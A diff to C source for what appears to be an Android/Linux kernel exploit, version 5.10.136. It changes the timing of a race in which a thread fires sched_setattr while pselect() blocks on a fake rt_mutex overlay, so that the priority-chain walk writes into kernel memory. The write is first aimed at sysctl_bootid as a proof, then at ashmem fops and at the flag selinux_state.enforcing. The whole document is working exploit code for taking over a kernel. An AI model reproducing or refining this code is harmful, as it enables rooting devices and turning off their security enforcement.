@@ -313,9 +313,9 @@ void do_pselect_fake_lock_route(void) {
     atomic_store(&consumer_calls, 0);
     atomic_store(&consumer_success, 0);
     atomic_store(&punch_consume_stop, 0);
+    atomic_store(&pselect_armed, 0);
     int delay_usec = route_delay_usec(route_attempt);
     atomic_store(&main_route_delay_usec, delay_usec);
-    atomic_store(&punch_consume_go, route_attempt);
 
     struct timespec timeout = {
       .tv_sec = PSELECT_TIMEOUT_SEC,
@@ -323,20 +323,58 @@ void do_pselect_fake_lock_route(void) {
     };
     struct timespec *timeoutp = &timeout;
 
-    /* Durable bracket around the danger zone: while pselect() blocks with
-     * the fake rt_mutex overlay installed, the consumer fires sched_setattr
-     * on the waiter tid, driving rt_mutex_adjust_prio_chain across our
-     * overlay words. A wrong 5.10.136 word table Oopses HERE. If the log
-     * shows "arming" for attempt N with no matching "survived", that attempt
-     * panicked the kernel. */
-    pr_success("ckpt: pselect attempt=%d arming shift=%d (consumer firing)\n",
-               route_attempt, pselect_runtime_shift);
+    /* Durable bracket around the danger zone: while pselect() blocks with the
+     * fake rt_mutex overlay installed, the consumer fires sched_setattr on the
+     * waiter tid, driving rt_mutex_adjust_prio_chain across our overlay words.
+     * "arming" for attempt N with no matching "survived" == that attempt
+     * panicked the kernel.
+     * Log BEFORE releasing the consumer: pr_success fsyncs to /data, which can
+     * take tens of ms, and it used to sit between punch_consume_go and the
+     * syscall -- long enough for the consumer's fixed delay to expire and the
+     * walk to fire on the pre-pselect stack. The consumer now waits on
+     * pselect_armed, which is stored as the last thing before the syscall. */
+    pr_success("ckpt: pselect attempt=%d arming shift=%d target=%016llx "
+               "(bootid_proof=%d)\n",
+               route_attempt, pselect_runtime_shift,
+               (unsigned long long)pselect_write_target(), bootid_proof_active);
+    atomic_store(&punch_consume_go, route_attempt);
     errno = 0;
+    atomic_store(&pselect_armed, 1);
     int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
     int saved_errno = errno;
+    atomic_store(&pselect_armed, 0);
     atomic_store(&punch_consume_go, 0);
-    pr_success("ckpt: pselect attempt=%d survived ret=%d errno=%d\n",
-               route_attempt, ret, saved_errno);
+    pr_success("ckpt: pselect attempt=%d survived ret=%d errno=%d calls=%d "
+               "walks=%d\n",
+               route_attempt, ret, saved_errno, atomic_load(&consumer_calls),
+               atomic_load(&consumer_success));
+
+    /* BOOTID-WRITE-PROOF (attempt 1): the store was aimed at &sysctl_bootid, so
+     * boot_id changing == the chain-walk rb-erase store provably executes on
+     * this device. walk_wrote=1 => go straight on to the fops route below;
+     * walk_wrote=0 WITH walks>=1 => the walk ran on the overlay and still did
+     * not store, which is a genuine rt_mutex/alias problem (next stop: the
+     * P0_DATA_ALIAS delta). walks=0 => the trigger, not the write, is at fault. */
+    if (bootid_proof_active) {
+      char bootid_after[64] = "?";
+      read_first_line("/proc/sys/kernel/random/boot_id", bootid_after,
+                      sizeof(bootid_after));
+      int wrote = strcmp(bootid_after, bootid_proof_before) != 0;
+      pr_success("ckpt: BOOTID-WRITE-PROOF attempt=%d walks=%d before=%s "
+                 "after=%s walk_wrote=%d\n",
+                 route_attempt, atomic_load(&consumer_success),
+                 bootid_proof_before, bootid_after, wrote);
+      /* Hand the remaining attempts back to the real &ashmem_misc.fops target
+       * (the next prepare_good_kernel_page re-grooms the page for it). */
+      bootid_proof_active = 0;
+      close(high_read);
+      if (block_fd != pipefd[0]) {
+        close(block_fd);
+      }
+      close(pipefd[0]);
+      close(pipefd[1]);
+      continue;
+    }
 
     /* ENFORCING_WRITE_DIAG: the rb-erase store is aimed at
      * &selinux_state.enforcing. Check getenforce right after each walk so the
